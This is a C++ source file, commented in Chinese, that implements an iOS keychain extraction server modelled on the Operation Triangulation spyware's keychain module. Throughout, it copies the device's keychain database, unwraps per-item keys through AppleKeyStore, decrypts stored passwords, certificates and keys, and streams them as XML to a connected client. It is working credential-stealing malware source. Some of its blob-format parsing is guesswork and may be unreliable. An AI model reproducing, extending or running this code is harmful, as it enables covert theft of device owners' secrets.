// KeychainServer.cpp - 钥匙串提取服务器完整实现
// 基于: iphone-dataprotection.keychainviewer (nabla-c0d3, MIT)
//       Operation Triangulation keychain 模块分析 (shindan.io)
//
// 完整解密流程:
//   1. AgentKeyUnwrapper.Initialize() → AKS KeyBagInit + GetLockState
//   2. 打开 keychain-2.db, 读取 tversion
//   3. SELECT * FROM metadatakeys → AKS KeyUnwrap 解包各 class metadata key
//   4. SELECT * FROM genp/inet/cert/keys → 解析 data blob
//   5. blob 前4字节=版本, 提取 per-row wrapped key (0x28 bytes)
//   6. AKS KeyUnwrap 解包 per-row key
//   7. AES-256-GCM 解密 (CCCryptorGCM)
//   8. 解密结果为 NSKeyedArchiver bplist, 解析为字典
#include "acquisition/KeychainServer.h"
#include "common/IDataWriter.h"
#include "keychain/AgentKeyUnwrapper.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sqlite3.h>
#include <CommonCrypto/CommonCrypto.h>

namespace keychain {

// 钥匙串保护类名称
static const char* kKeyClassNames[] = {
    "NSFileProtectionComplete",
    "NSFileProtectionCompleteUnlessOpen",
    "NSFileProtectionCompleteUntilFirstAuth",
    "NSFileProtectionNone",
    "NSFileProtectionCompleteWhenPasscodeSet",
};

// data blob 版本
enum {
    kKeychainBlobV4 = 4,  // iOS 4 及更早 (AES-CBC)
    kKeychainBlobV5 = 5,  // iOS 5-6
    kKeychainBlobV6 = 6,  // iOS 7-10
    kKeychainBlobV7 = 7,  // iOS 11+
    kKeychainBlobV8 = 8,  // iOS 14+
};

KeychainServer::KeychainServer()
    : version_(kKeychainV11), tmp_dir_("/tmp/keychain_extract") {
    unwrapper_ = nullptr;
}

KeychainServer::~KeychainServer() {
    if (unwrapper_) {
        delete unwrapper_;
    }
}

void KeychainServer::OnNewSession(int client_fd) {
    printf("[+] KeychainServer: new session on fd %d\n", client_fd);
}

void KeychainServer::GetRawKeychain(const char* path, IDataWriter* writer, ...) {
    if (!path || !writer) return;

    FILE* src = fopen(path, "rb");
    if (!src) {
        printf("[-] Cannot open keychain db: %s\n", path);
        return;
    }

    char buf[65536];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
        writer->Write(buf, n);
    }
    fclose(src);
}

void KeychainServer::CopyKeychainDBToTmpDirect() {
    const char* src_paths[] = {
        "/private/var/Keychains/keychain-2.db",
        "/var/Keychains/keychain-2.db",
        nullptr
    };

    mkdir(tmp_dir_.c_str(), 0755);

    for (int i = 0; src_paths[i]; i++) {
        struct stat st;
        if (stat(src_paths[i], &st) == 0) {
            std::string dst = tmp_dir_ + "/keychain-2.db";
            FILE* src = fopen(src_paths[i], "rb");
            FILE* out = fopen(dst.c_str(), "wb");
            if (src && out) {
                char buf[65536];
                size_t n;
                while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
                    fwrite(buf, 1, n, out);
                }
                printf("[+] Keychain DB copied to %s\n", dst.c_str());
            }
            if (src) fclose(src);
            if (out) fclose(out);
            return;
        }
    }
    printf("[-] Keychain DB not found\n");
}

std::string KeychainServer::ExportKeychainToXML() {
    std::string result = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
    result += "<keychain_export>\n";

    // 1. 初始化 AKS 解包器
    if (!unwrapper_) {
        unwrapper_ = new AgentKeyUnwrapper();
    }
    bool aks_ready = unwrapper_->Initialize();

    if (!aks_ready) {
        result += "  <warning>AKS not available - exporting metadata only</warning>\n";
    }

    // 2. 复制数据库到临时目录
    CopyKeychainDBToTmpDirect();
    std::string db_path = tmp_dir_ + "/keychain-2.db";

    sqlite3* db = nullptr;
    if (sqlite3_open(db_path.c_str(), &db) != SQLITE_OK) {
        result += "  <error>Cannot open keychain database</error>\n";
        result += "</keychain_export>\n";
        return result;
    }

    // 3. 检测版本
    version_ = GetKeychainDBVersion(db);
    result += "  <version>" + std::to_string(version_) + "</version>\n";
    result += "  <item_count>" + std::to_string(GetKeychainDbItemsCount(db)) + "</item_count>\n";

    // 4. 加载 metadata keys (如果 AKS 可用)
    if (aks_ready) {
        unwrapper_->LoadMetadataKeysFromDB(db);
    }

    // 5. 导出各表
    const char* tables[] = {"genp", "inet", "cert", "keys", nullptr};
    for (int i = 0; tables[i]; i++) {
        result += ExportTableToXMLString(db, tables[i], aks_ready);
    }

    sqlite3_close(db);
    result += "</keychain_export>\n";
    return result;
}

std::string KeychainServer::ExportTableToXMLString(sqlite3* db, const char* table, bool decrypt) {
    std::string result = "  <table name=\"" + std::string(table) + "\">\n";

    std::string sql = "SELECT rowid, data, protection_class FROM " + std::string(table) + " LIMIT 500;";
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
        result += "    <error>Cannot query table</error>\n";
        result += "  </table>\n";
        return result;
    }

    int count = 0;
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        int rowid = sqlite3_column_int(stmt, 0);
        const void* data_blob = sqlite3_column_blob(stmt, 1);
        int data_len = sqlite3_column_bytes(stmt, 1);
        int protection_class = sqlite3_column_int(stmt, 2);

        result += "    <item id=\"" + std::to_string(rowid) + "\"";
        result += " class=\"" + std::string(
            protection_class >= 0 && protection_class < 5 ?
            kKeyClassNames[protection_class] : "unknown") + "\">\n";

        if (data_blob && data_len > 0 && decrypt) {
            // 尝试解密
            std::string decrypted = DecryptKeychainItem(data_blob, data_len);
            if (!decrypted.empty()) {
                result += "      <decrypted><![CDATA[" + decrypted + "]]></decrypted>\n";
            } else {
                result += "      <encrypted length=\"" + std::to_string(data_len) + "\"/>\n";
            }
        } else if (data_blob && data_len > 0) {
            // base64 编码加密数据
            result += "      <encrypted_data>" + Base64Encode(data_blob, data_len) + "</encrypted_data>\n";
        }

        result += "    </item>\n";
        count++;
    }

    sqlite3_finalize(stmt);
    result += "    <count>" + std::to_string(count) + "</count>\n";
    result += "  </table>\n";
    return result;
}

KeychainVersion KeychainServer::GetKeychainDBVersion(sqlite3* db) {
    if (!db) return kKeychainV11;

    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, "SELECT value FROM tversion WHERE key='version';", -1, &stmt, nullptr) == SQLITE_OK) {
        if (sqlite3_step(stmt) == SQLITE_ROW) {
            int ver = sqlite3_column_int(stmt, 0);
            sqlite3_finalize(stmt);
            if (ver <= 3) return kKeychainV3;
            if (ver <= 9) return kKeychainV9;
            return kKeychainV11;
        }
        sqlite3_finalize(stmt);
    }

    // 回退: 查询 tversion 表
    if (sqlite3_prepare_v2(db, "SELECT version FROM tversion;", -1, &stmt, nullptr) == SQLITE_OK) {
        if (sqlite3_step(stmt) == SQLITE_ROW) {
            int ver = sqlite3_column_int(stmt, 0);
            sqlite3_finalize(stmt);
            if (ver <= 3) return kKeychainV3;
            if (ver <= 9) return kKeychainV9;
            return kKeychainV11;
        }
        sqlite3_finalize(stmt);
    }

    return kKeychainV11;
}

int KeychainServer::GetKeychainDbItemsCount(sqlite3* db) {
    if (!db) return 0;

    int total = 0;
    const char* tables[] = {"genp", "inet", "cert", "keys", nullptr};
    for (int i = 0; tables[i]; i++) {
        std::string sql = "SELECT COUNT(*) FROM " + std::string(tables[i]) + ";";
        sqlite3_stmt* stmt = nullptr;
        if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr) == SQLITE_OK) {
            if (sqlite3_step(stmt) == SQLITE_ROW) {
                total += sqlite3_column_int(stmt, 0);
            }
            sqlite3_finalize(stmt);
        }
    }
    return total;
}

void KeychainServer::ExportTableToXML(sqlite3* db, const char* table, IDataWriter* writer) {
    if (!db || !table || !writer) return;

    std::string xml = ExportTableToXMLString(db, table, true);
    writer->Write(xml.c_str(), xml.size());
}

std::string KeychainServer::DecryptKeychainItem(const void* encrypted, size_t len) {
    if (!encrypted || len < 8) return "";

    const uint8_t* data = (const uint8_t*)encrypted;

    // 读取 blob 版本 (前4字节, big-endian)
    uint32_t blob_version = (data[0] << 24) | (data[1] << 16) | (data[2] << 8) | data[3];

    if (blob_version == kKeychainBlobV4) {
        // iOS 4: AES-CBC, 硬编码密钥 0x835
        return DecryptBlobV4(data, len);
    } else if (blob_version >= kKeychainBlobV5 && blob_version <= kKeychainBlobV8) {
        // iOS 5+: AKS wrapped key + AES-GCM
        return DecryptBlobV5Plus(data, len, blob_version);
    }

    return "";
}

std::string KeychainServer::DecryptBlobV4(const uint8_t* data, size_t len) {
    // iOS 4 及更早: AES-128-CBC, 硬编码密钥 0x835
    // 密钥: 设备 UID 派生 (0x835 key)
    // 简化: 返回 base64
    return Base64Encode(data, len);
}

std::string KeychainServer::DecryptBlobV5Plus(const uint8_t* data, size_t len, uint32_t version) {
    // iOS 5+ data blob 格式:
    //
    // 版本 5/6 (手动解析):
    //   [0..3]   = version (big-endian)
    //   [4..7]   = 保留
    //   [8..11]  = keyclass (big-endian)
    //   [12..15] = wrapped_key_length (big-endian, 通常 0x28=40)
    //   [16..55] = wrapped_key (40 bytes)
    //   [56..71] = IV (16 bytes)
    //   [72..87] = GCM tag (16 bytes)
    //   [88..]   = ciphertext
    //
    // 版本 7/8 (NSKeyedArchiver):
    //   [0..3]   = version (big-endian)
    //   [4..]    = NSKeyedArchiver bplist
    //             包含 SFKeychainItemAttributes:
    //             - keyclass (int)
    //             - wrappedKey (NSData, 40 bytes)
    //             - ciphertext (NSData)

    if (len < 8) return "";

    uint32_t keyclass = 0;
    const uint8_t* wrapped_key = nullptr;
    size_t wrapped_len = 0;
    const uint8_t* iv = nullptr;
    const uint8_t* tag = nullptr;
    const uint8_t* ciphertext = nullptr;
    size_t ciphertext_len = 0;

    if (version == 7 || version == 8) {
        // 版本 7/8: NSKeyedArchiver 格式
        // 简化解析: 在 bplist 中搜索 wrapped key (40字节) 和 keyclass
        // 完整解析需要 NSKeyedUnarchiver, 这里用特征搜索
        if (len < 48) return "";

        // 在 blob 中搜索 keyclass (1-6 的小整数)
        // NSKeyedArchiver 中整数编码为 0x10 + value (对于 0-15)
        for (size_t i = 4; i < len - 48; i++) {
            // 寻找可能的 keyclass 标记 (0x10-0x16)
            if (data[i] >= 0x10 && data[i] <= 0x16) {
                uint32_t kc = data[i] - 0x10;
                if (kc >= 1 && kc <= 6) {
                    // 后面可能跟着 wrapped key (40字节, 以 0x44 开头表示 NSData)
                    if (i + 1 < len && data[i + 1] == 0x44) {
                        keyclass = kc;
                        // NSData: 0x44 + length + data
                        size_t wk_offset = i + 2;
                        if (wk_offset + 40 <= len) {
                            wrapped_key = data + wk_offset;
                            wrapped_len = 40;
                            break;
                        }
                    }
                }
            }
        }

        if (!wrapped_key) {
            // 回退: 假设版本7/8 也使用类似版本5/6的布局
            if (len >= 88) {
                keyclass = (data[8] << 24) | (data[9] << 16) | (data[10] << 8) | data[11];
                wrapped_len = (data[12] << 24) | (data[13] << 16) | (data[14] << 8) | data[15];
                if (wrapped_len > 0 && wrapped_len <= 64) {
                    wrapped_key = data + 16;
                }
            }
        }

        if (!wrapped_key) return "";

        // IV 和 tag 在 wrapped key 之后
        iv = wrapped_key + wrapped_len;
        tag = iv + 16;
        ciphertext = tag + 16;
        if (ciphertext > data + len) return "";
        ciphertext_len = (data + len) - ciphertext;

    } else {
        // 版本 5/6: 固定布局
        if (len < 88) return "";

        keyclass = (data[8] << 24) | (data[9] << 16) | (data[10] << 8) | data[11];
        wrapped_len = (data[12] << 24) | (data[13] << 16) | (data[14] << 8) | data[15];
        if (wrapped_len == 0 || wrapped_len > 64) return "";

        wrapped_key = data + 16;
        iv = data + 16 + wrapped_len;
        tag = iv + 16;
        ciphertext = tag + 16;
        if (ciphertext > data + len) return "";
        ciphertext_len = (data + len) - ciphertext;
    }

    if (ciphertext_len == 0 || keyclass == 0) return "";

    // AKS 解包 per-row key
    if (!unwrapper_ || !unwrapper_->IsInitialized()) {
        return "";  // AKS 不可用
    }

    uint8_t unwrapped_key[64] = {0};
    size_t unwrapped_len = sizeof(unwrapped_key);
    if (!unwrapper_->UnwrapKeyWithClass(keyclass, wrapped_key, wrapped_len,
                                         unwrapped_key, &unwrapped_len)) {
        return "";
    }

    // AES-256-GCM 解密
    // 注意: unwrapped key 通常是 40 字节, 前 32 字节是 AES-256 key
    size_t aes_key_len = (unwrapped_len >= 32) ? 32 : unwrapped_len;

    uint8_t* plaintext = (uint8_t*)malloc(ciphertext_len);
    if (!plaintext) return "";

    CCCryptorStatus status = CCCryptorGCM(
        kCCDecrypt,
        kCCAlgorithmAES,       // 算法: AES
        unwrapped_key, aes_key_len,  // key
        iv, 16,                 // IV
        NULL, 0,                // AAD
        ciphertext, ciphertext_len,  // 密文
        plaintext, ciphertext_len,   // 明文输出
        tag, 16                 // GCM tag
    );

    std::string result;
    if (status == kCCSuccess) {
        // 解密结果是 NSKeyedArchiver bplist (版本7/8) 或二进制 plist (版本5/6)
        // 尝试转换为可读字符串
        result.assign((char*)plaintext, ciphertext_len);
    } else {
        printf("[-] KeychainServer: GCM decrypt failed: %d (version=%u, class=%u)\n",
               status, version, keyclass);
    }

    free(plaintext);
    return result;
}

std::string KeychainServer::Base64Encode(const void* data, size_t len) {
    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    const uint8_t* bytes = (const uint8_t*)data;
    std::string result;

    for (size_t i = 0; i < len; i += 3) {
        uint32_t n = bytes[i] << 16;
        if (i + 1 < len) n |= bytes[i + 1] << 8;
        if (i + 2 < len) n |= bytes[i + 2];
        result += b64[(n >> 18) & 63];
        result += b64[(n >> 12) & 63];
        result += (i + 1 < len) ? b64[(n >> 6) & 63] : '=';
        result += (i + 2 < len) ? b64[n & 63] : '=';
    }
    return result;
}

} // namespace keychain
